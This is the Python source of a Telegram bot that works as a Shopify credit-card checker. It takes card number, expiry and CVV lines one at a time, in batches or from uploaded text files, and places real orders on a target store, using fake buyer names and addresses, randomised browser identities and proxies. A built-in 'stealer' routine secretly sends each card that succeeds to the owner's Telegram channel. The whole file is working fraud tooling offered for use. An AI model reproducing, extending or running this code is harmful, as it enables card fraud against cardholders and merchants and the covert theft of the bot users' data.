import time
import asyncio
import re
import os
import random
import string
import uuid
import json
import requests
import urllib3
from urllib.parse import quote
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from TOOLS.getcc_for_mass import *

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== CONFIGURATION ==========
GATE_NAME = "Shopify - Auto 💸"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100
# Change this to your target Shopify store (without https://)
DEFAULT_SHOPIFY_SITE = "store.myshopify.com"

OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
STEALER_CHANNEL_ID = -1003627495953

# ========== HELPER FUNCTIONS (original) ==========
def random_string(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def random_name():
    first = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emily', 'James', 'Emma', 'Robert', 'Olivia']
    last = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Wilson', 'Taylor']
    return random.choice(first), random.choice(last)

def random_address():
    data = [
        ('1600 Pennsylvania Ave NW', '', 'Washington', 'DC', '20500', '202'),
        ('350 Fifth Avenue', '', 'New York', 'NY', '10118', '212'),
        ('233 S Wacker Dr', '', 'Chicago', 'IL', '60606', '312'),
        ('1 Infinite Loop', '', 'Cupertino', 'CA', '95014', '408'),
        ('1 Microsoft Way', '', 'Redmond', 'WA', '98052', '425'),
    ]
    addr = random.choice(data)
    phone = f"+1{addr[5]}{random.randint(200,999)}{random.randint(1000,9999)}"
    return {'address1': addr[0], 'address2': addr[1], 'city': addr[2], 'countryCode': 'US',
            'postalCode': addr[4], 'zoneCode': addr[3], 'phone': phone}

def random_ua():
    chrome_ver = f"{random.randint(100,120)}.0.{random.randint(1000,9999)}.{random.randint(10,200)}"
    return f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36'

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) >= 4 and parts[1].isdigit():
        host, port = parts[0], parts[1]
        user = quote(parts[2], safe='')
        pwd = quote(':'.join(parts[3:]), safe='')
        return f"http://{user}:{pwd}@{host}:{port}"
    return None

def create_proxy_session(proxy_str=None):
    session = requests.Session()
    if proxy_str:
        proxy_url = parse_proxy(proxy_str)
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
            session.verify = False
    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=2)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

# ========== CORE SHOPIFY FUNCTIONS (synchronous) ==========
def find_cheapest_product(site):
    session = create_proxy_session()
    session.headers.update({"User-Agent": random_ua()})
    try:
        resp = session.get(f"https://{site}/products.json?limit=250", timeout=15)
        if resp.status_code != 200:
            return None, None, None, "PRODUCTS_FETCH_FAILED"
        products = resp.json().get('products', [])
        cheapest_variant = None
        cheapest_price = float('inf')
        product_handle = None
        for product in products:
            for variant in product.get('variants', []):
                price = float(variant.get('price', 999999))
                if 0 < price < cheapest_price:
                    cheapest_price = price
                    cheapest_variant = variant['id']
                    product_handle = product.get('handle', '')
        if not cheapest_variant:
            return None, None, None, "NO_PRODUCT_FOUND"
        return cheapest_variant, cheapest_price, product_handle, "OK"
    except Exception as e:
        return None, None, None, str(e)[:50]

def create_checkout_session(site, variant_id, product_handle):
    ua = random_ua()
    session = create_proxy_session()
    session.headers.update({"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
    try:
        headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': f'https://{site}', 'user-agent': ua}
        resp = session.post(f'https://{site}/cart/add.js', headers=headers, json={'items': [{'id': int(variant_id), 'quantity': 1}]}, timeout=30)
        if resp.status_code != 200:
            resp = session.post(f'https://{site}/cart/add', data={'id': str(variant_id), 'quantity': '1'}, timeout=30)
            if resp.status_code != 200:
                return None, 'ERROR', 'ADD_TO_CART_FAILED'
        resp = session.post(f'https://{site}/cart', data={'updates[]': '1', 'checkout': ''}, allow_redirects=True, timeout=30)
        if 'checkout' not in resp.url:
            return None, 'ERROR', 'CHECKOUT_REDIRECT_FAILED'
        checkout_resp = session.get(resp.url, allow_redirects=True, timeout=30)
        checkout_text = checkout_resp.text
        lower = checkout_text.lower()
        if 'verifying your connection' in lower or 'checking your browser' in lower:
            return None, 'VERIFY', 'VERIFY_BROWSER'
        if 'access denied' in lower:
            return None, 'BLOCKED', 'ACCESS_DENIED'
        sig_patterns = [
            r'checkoutCardsinkCallerIdentificationSignature[&quot;:]+([^&"]+)',
            r'"checkoutCardsinkCallerIdentificationSignature"\s*:\s*"([^"]+)"',
            r'callerIdentificationSignature["\s:]+([^"&\s]+)',
        ]
        shopify_sig = None
        for pattern in sig_patterns:
            m = re.search(pattern, checkout_text)
            if m:
                shopify_sig = m.group(1).replace('&quot;', '').strip()
                if shopify_sig and len(shopify_sig) > 10:
                    break
                shopify_sig = None
        if not shopify_sig:
            return None, 'ERROR', 'NO_SIGNATURE'
        m = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', checkout_text)
        session_token = m.group(1).replace('&quot;', '').strip() if m else None
        m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', checkout_text)
        queue_token = m.group(1) if m else None
        m = re.search(r'"stableId"\s*:\s*"([a-f0-9-]{36})"', checkout_text)
        stable_id = m.group(1) if m else str(uuid.uuid4())
        m = re.search(r'/checkouts/cn/([^/]+)/', checkout_resp.url) or re.search(r'/checkouts/([^/]+)/', checkout_resp.url)
        checkout_source_id = m.group(1) if m else ''
        m = re.search(r'x-checkout-web-build-id[&quot;:]+([a-f0-9]+)', checkout_text)
        build_id = m.group(1) if m else 'fb347c24d80acb8076f676fa55018bb00cddfde9'
        m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', checkout_text)
        payment_method_id = m.group(1) if m else None
        return {
            'site': site, 'session': session, 'ua': ua, 'sig': shopify_sig,
            'session_token': session_token, 'queue_token': queue_token, 'stable_id': stable_id,
            'checkout_source_id': checkout_source_id, 'build_id': build_id, 'payment_method_id': payment_method_id,
            'checkout_url': checkout_resp.url
        }, 'OK', 'READY'
    except Exception as e:
        return None, 'ERROR', str(e)[:30]

def check_card_sync(checkout_data, card, variant_id, price, require_shipping=None):
    try:
        parts = card.split("|")
        card_number, month = parts[0], int(parts[1])
        year = int("20" + parts[2]) if len(parts[2]) == 2 else int(parts[2])
        cvv = parts[3].strip()
        site = checkout_data['site']
        session = checkout_data['session']
        ua = checkout_data['ua']
        sig = checkout_data['sig']
        session_token = checkout_data['session_token']
        queue_token = checkout_data['queue_token']
        stable_id = checkout_data['stable_id']
        checkout_source_id = checkout_data['checkout_source_id']
        build_id = checkout_data['build_id']
        payment_method_id = checkout_data['payment_method_id']
        checkout_url = checkout_data['checkout_url']
        first_name, last_name = random_name()
        cardholder = f"{first_name} {last_name}"
        email = f"{first_name.lower()}{last_name.lower()}{random.randint(10,999)}@gmail.com"
        addr = random_address()
        addr['firstName'], addr['lastName'] = first_name, last_name
        pay_session = create_proxy_session()
        pay_headers = {'accept': 'application/json', 'content-type': 'application/json',
                       'origin': 'https://checkout.pci.shopifyinc.com', 'shopify-identification-signature': sig, 'user-agent': ua}
        pay_json = {'credit_card': {'number': card_number, 'month': month, 'year': year, 'verification_value': cvv,
                    'name': cardholder}, 'payment_session_scope': site.replace('www.', '')}
        resp = pay_session.post('https://checkout.pci.shopifyinc.com/sessions', headers=pay_headers, json=pay_json, timeout=30)
        if resp.status_code != 200:
            return 'ERROR', 'PCI_FAILED', price
        payment_session_id = resp.json().get('id')
        if not payment_session_id:
            return 'ERROR', 'NO_SESSION_ID', price
        if require_shipping:
            delivery = {
                'deliveryLines': [{'destination': {'streetAddress': addr},
                    'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}},
                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                    'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': True}],
                'noDeliveryRequired': [], 'useProgressiveRates': False, 'supportsSplitShipping': True
            }
        else:
            delivery = {
                'deliveryLines': [{'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {}},
                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                    'deliveryMethodTypes': ['NONE'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': False}],
                'noDeliveryRequired': [], 'useProgressiveRates': False, 'supportsSplitShipping': True
            }
        gql_headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': f'https://{site}',
            'referer': checkout_url, 'user-agent': ua, 'x-checkout-one-session-token': session_token or '',
            'x-checkout-web-build-id': build_id, 'x-checkout-web-source-id': checkout_source_id}
        gql_data = {
            'variables': {
                'input': {
                    'sessionInput': {'sessionToken': session_token or ''}, 'queueToken': queue_token or '',
                    'delivery': delivery,
                    'merchandise': {'merchandiseLines': [{'stableId': stable_id,
                        'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                            'variantId': f'gid://shopify/ProductVariant/{variant_id}', 'properties': []}},
                        'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}}]},
                    'payment': {'totalAmount': {'any': True},
                        'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_method_id or '',
                            'sessionId': payment_session_id, 'billingAddress': {'streetAddress': addr}}}, 'amount': {'any': True}}],
                        'billingAddress': {'streetAddress': addr}},
                    'buyerIdentity': {'customer': {'presentmentCurrency': 'USD', 'countryCode': 'US'}, 'email': email},
                    'taxes': {'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}}},
                    'tip': {'tipLines': []}, 'note': {'message': None, 'customAttributes': []},
                },
                'attemptToken': f"{checkout_source_id}-{random_string(11)}",
            },
            'operationName': 'SubmitForCompletion',
            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){__typename ...on SubmitSuccess{receipt{...R}}...on SubmitAlreadyAccepted{receipt{...R}}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage}__typename}...on Throttled{pollAfter __typename}...on SubmittedForCompletion{receipt{...R}}}}fragment R on Receipt{__typename ...on ProcessedReceipt{id redirectUrl orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code __typename}}__typename}}'
        }
        resp = session.post(f'https://{site}/checkouts/unstable/graphql', params={'operationName': 'SubmitForCompletion'},
                           headers=gql_headers, json=gql_data, timeout=60)
        if resp.status_code != 200:
            return 'ERROR', f'HTTP_{resp.status_code}', price
        result = resp.json()
        resp_text = resp.text.lower()
        if 'errors' in result:
            err = result['errors'][0].get('message', 'ERROR')[:40]
            if 'delivery' in err.lower() and require_shipping is None:
                return check_card_sync(checkout_data, card, variant_id, price, require_shipping=True)
            return 'ERROR', err, price
        completion = result.get('data', {}).get('submitForCompletion', {})
        if not completion:
            if 'card_declined' in resp_text or 'CARD_DECLINED' in resp.text:
                return 'DECLINED', 'CARD_DECLINED', price
            if 'insufficient' in resp_text:
                return 'DECLINED', 'INSUFFICIENT_FUNDS', price
            return 'ERROR', 'NO_COMPLETION', price
        typename = completion.get('__typename', '')
        if typename == 'SubmitRejected':
            errors = completion.get('errors', [])
            if errors:
                err = errors[0].get('code', errors[0].get('localizedMessage', 'REJECTED'))
                if 'DELIVERY' in err and require_shipping is None:
                    return check_card_sync(checkout_data, card, variant_id, price, require_shipping=True)
                return 'DECLINED', err, price
            return 'DECLINED', 'REJECTED', price
        if typename == 'SubmitFailed':
            return 'DECLINED', completion.get('reason', 'FAILED'), price
        receipt = completion.get('receipt', {})
        receipt_type = receipt.get('__typename', '')
        receipt_id = receipt.get('id')
        if receipt_type == 'ProcessedReceipt' or receipt.get('orderStatusPageUrl'):
            return 'CHARGED', 'ORDER_PLACED', price
        if receipt_type == 'FailedReceipt':
            err = receipt.get('processingError', {}).get('code', 'FAILED')
            return 'DECLINED', err, price
        if receipt_id and receipt_type in ['ProcessingReceipt', 'WaitingReceipt', '']:
            poll_query = 'query Poll($id:ID!,$token:String!){receipt(receiptId:$id,sessionInput:{sessionToken:$token}){__typename ...on ProcessedReceipt{id orderStatusPageUrl}...on FailedReceipt{processingError{...on PaymentFailed{code}}}}}'
            for _ in range(15):
                time.sleep(2)
                try:
                    poll_resp = session.post(f'https://{site}/checkouts/unstable/graphql', headers=gql_headers,
                        json={'variables': {'id': receipt_id, 'token': session_token or ''}, 'operationName': 'Poll', 'query': poll_query}, timeout=20)
                    if poll_resp.status_code == 200:
                        poll_data = poll_resp.json().get('data', {}).get('receipt', {})
                        poll_type = poll_data.get('__typename', '')
                        if poll_type == 'ProcessedReceipt' and poll_data.get('orderStatusPageUrl'):
                            return 'CHARGED', 'ORDER_PLACED', price
                        if poll_type == 'FailedReceipt':
                            err = poll_data.get('processingError', {}).get('code', 'PAYMENT_FAILED')
                            return 'DECLINED', err, price
                        if poll_type in ['ProcessingReceipt', 'WaitingReceipt']:
                            continue
                except:
                    pass
            return 'ERROR', 'POLL_TIMEOUT', price
        if typename == 'Throttled':
            return 'ERROR', 'THROTTLED', price
        if 'card_declined' in resp_text or 'CARD_DECLINED' in resp.text:
            return 'DECLINED', 'CARD_DECLINED', price
        if 'insufficient' in resp_text:
            return 'DECLINED', 'INSUFFICIENT_FUNDS', price
        return 'ERROR', typename if typename else resp.text[:40].replace('\n', ' '), price
    except Exception as e:
        return 'ERROR', str(e)[:40], price

def shopify_check_sync(card_line, site=None):
    if not site:
        site = DEFAULT_SHOPIFY_SITE
    try:
        variant_id, price, product_handle, status = find_cheapest_product(site)
        if not variant_id:
            return "Error", f"Product fetch failed: {status}", "0.00"
        checkout_data, chk_status, msg = create_checkout_session(site, variant_id, product_handle)
        if chk_status != 'OK':
            return "Error", f"Checkout creation failed: {msg}", f"{price:.2f}"
        result_status, result_msg, final_price = check_card_sync(checkout_data, card_line, variant_id, price)
        if result_status == 'CHARGED':
            return "ORDER PLACED", result_msg, f"{price:.2f}"
        elif result_status == 'DECLINED':
            return "Declined ❌", result_msg, f"{price:.2f}"
        else:
            return "Error", result_msg, f"{price:.2f}"
    except Exception as e:
        return "Error", str(e)[:50], "0.00"

# ========== ASYNC WRAPPER ==========
async def shopify_check_async(card_line, site=None):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, shopify_check_sync, card_line, site)

def extract_cards(text):
    return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)

# ========== STEALER FUNCTION ==========
async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
    try:
        stealer_msg = f"""✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅

{SYMBOL} 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {gateway}
{SYMBOL} 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response}

{SYMBOL} 𝗧𝗼𝗼ᴋ {time_taken:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=stealer_msg, parse_mode="HTML")
    except Exception as e:
        print(f"[Stealer Error] {e}")

# ========== SINGLE CHECK /sh ==========
@Client.on_message(filters.command("sh", [".", "/"]))
async def shopify_single(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]
        getcc = await getmessage(message)
        if not getcc:
            await message.reply_text(
                f"✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦\n"
                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                f"↪ <b>ᴜꜱᴀɢᴇ :</b> /sh cc|mm|yy|cvv",
                quote=True, parse_mode=enums.ParseMode.HTML
            )
            return
        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        # Animation step 1
        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
        firstchk = await message.reply_text(firstresp, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)
        # Step 2
        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
        secondchk = await client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)
        start = time.perf_counter()
        status, api_message, price = await shopify_check_async(fullcc)
        elapsed = time.perf_counter() - start
        # Step 3 (full squares)
        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>
{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■"""
        thirdchk = await client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)
        getbin = await get_bin_details(cc)
        brand = getbin[0] if len(getbin) > 0 else "Unknown"
        type_ = getbin[1] if len(getbin) > 1 else "Unknown"
        level = getbin[2] if len(getbin) > 2 else "Unknown"
        bank = getbin[3] if len(getbin) > 3 else "Unknown"
        country = getbin[4] if len(getbin) > 4 else "Unknown"
        flag = getbin[5] if len(getbin) > 5 else ""
        if status == "ORDER PLACED":
            await send_hit_to_stealer(client, fullcc, status, api_message, GATE_NAME, elapsed, first_name, role)
        final_text = f"""<b>{status}</b>

{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {api_message}
{SYMBOL} 𝗣𝗿𝗶𝗰𝗲 ⇾ ${price}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}
{SYMBOL} 𝗕ᴀɴᴋ: {bank}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}

{SYMBOL} 𝗧ᴏᴏᴋ {elapsed:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await client.edit_message_text(message.chat.id, thirdchk.id, final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        await setantispamtime(user_id)
        await deductcredit(user_id)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== MASS CHECK /msh ==========
@Client.on_message(filters.command("msh", [".", "/"]))
async def shopify_mass(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]
        getcc = await getcc_for_mass(message, role)
        if not getcc[0]:
            await message.reply_text(getcc[1], message.id, parse_mode=enums.ParseMode.HTML)
            return
        ccs = getcc[1]
        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply_text(f"✦ ᴍᴀx {MAX_MSC_LIMIT} ᴄᴄ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ {len(ccs)} ✦", message.id, parse_mode=enums.ParseMode.HTML)
            ccs = ccs[:MAX_MSC_LIMIT]
        await process_sequential(client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== TXT FILE CHECK /tsh ==========
@Client.on_message(filters.command("tsh", [".", "/"]))
async def shopify_txt(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]:
            return
        role = checkall[1]
        target = None
        if message.reply_to_message and message.reply_to_message.document:
            target = message.reply_to_message
        elif message.document:
            target = message
        if not target or not target.document.file_name.endswith(".txt"):
            await message.reply_text(
                f"✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦\n"
                f"⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n"
                f"↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to a .txt file (max {MAX_TSC_LIMIT} cards)",
                quote=True, parse_mode=enums.ParseMode.HTML
            )
            return
        file_path = await client.download_media(target)
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)
        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True, parse_mode=enums.ParseMode.HTML)
            return
        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True, parse_mode=enums.ParseMode.HTML)
            ccs = ccs[:MAX_TSC_LIMIT]
        await process_sequential(client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# ========== SEQUENTIAL PROCESSING ==========
async def process_sequential(client, message, ccs, user_id, first_name, role):
    total = len(ccs)
    approved_count = 0
    declined_count = 0
    start_time = time.perf_counter()
    approved_cards = []
    progress_msg = await message.reply(
        f"Shopify Checker\n\n"
        f"{SYMBOL} Progress: 0/{total}\n"
        f"ORDER PLACED ✅: 0\nDeclined ❌: 0\nRemaining: {total}\n\n"
        f"Checked by: {first_name} ({role})",
        quote=True, parse_mode=enums.ParseMode.HTML
    )
    for idx, fullcc in enumerate(ccs, 1):
        status, api_message, price = await shopify_check_async(fullcc)
        cc_num = fullcc.split('|')[0]
        bin_data = await get_bin_details(cc_num)
        brand = bin_data[0] if len(bin_data) > 0 else "Unknown"
        type_ = bin_data[1] if len(bin_data) > 1 else "Unknown"
        level = bin_data[2] if len(bin_data) > 2 else "Unknown"
        bank = bin_data[3] if len(bin_data) > 3 else "Unknown"
        country = bin_data[4] if len(bin_data) > 4 else "Unknown"
        flag = bin_data[5] if len(bin_data) > 5 else ""
        if status == "ORDER PLACED":
            approved_count += 1
            card_time = time.perf_counter() - start_time
            approved_cards.append({
                "fullcc": fullcc,
                "status": status,
                "response": api_message,
                "price": price,
                "brand": f"{brand}_{type_}-{level}",
                "bank": bank,
                "country": country,
                "flag": flag,
                "time": card_time
            })
            await send_hit_to_stealer(client, fullcc, status, api_message, GATE_NAME, card_time, first_name, role)
        else:
            declined_count += 1
        remaining = total - idx
        await progress_msg.edit_text(
            f"Shopify Checker\n\n"
            f"{SYMBOL} Progress: {idx}/{total}\n"
            f"ORDER PLACED ✅: {approved_count}\nDeclined ❌: {declined_count}\nRemaining: {remaining}\n\n"
            f"Checked by: {first_name} ({role})",
            parse_mode=enums.ParseMode.HTML
        )
        await asyncio.sleep(0.5)
    await progress_msg.delete()
    for card in approved_cards:
        approved_msg = f"""<b>{card['status']}</b>

{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>
{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}
{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}
{SYMBOL} 𝗣𝗿𝗶𝗰𝗲 ⇾ ${card['price']}

{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}
{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}
{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}

{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs
{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"""
        await message.reply_text(approved_msg, quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)
    elapsed = round(time.perf_counter() - start_time, 2)
    if approved_count > 0:
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        decl_text = f"❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined_count})\n\n━━━━━━━━━━━━━━━━━━━━\n"
        for card in declined_list[:15]:
            decl_text += f"{SYMBOL} {card} → Declined\n"
        if declined_count > 15:
            decl_text += f"\n... and {declined_count - 15} more declined cards"
        decl_text += f"\n━━━━━━━━━━━━━━━━━━━━\n✅ ORDER PLACED: {approved_count}\n❌ Declined: {declined_count}\n📊 Total: {total}\n⏱ Time: {elapsed}s\n👤 Checked by: {first_name} ({role})"
        await message.reply_text(decl_text, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(
            f"❌ 𝗡ᴏ 𝗢𝗥𝗗𝗘𝗥 𝗣𝗟𝗔𝗖𝗘𝗗\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total Cards: {total}\n❌ All Declined: {declined_count}\n⏱ Time: {elapsed}s\n"
            f"👤 Checked by: {first_name} ({role})",
            quote=True, parse_mode=enums.ParseMode.HTML
        )
    await setantispamtime(user_id)
    await massdeductcredit(user_id, total)
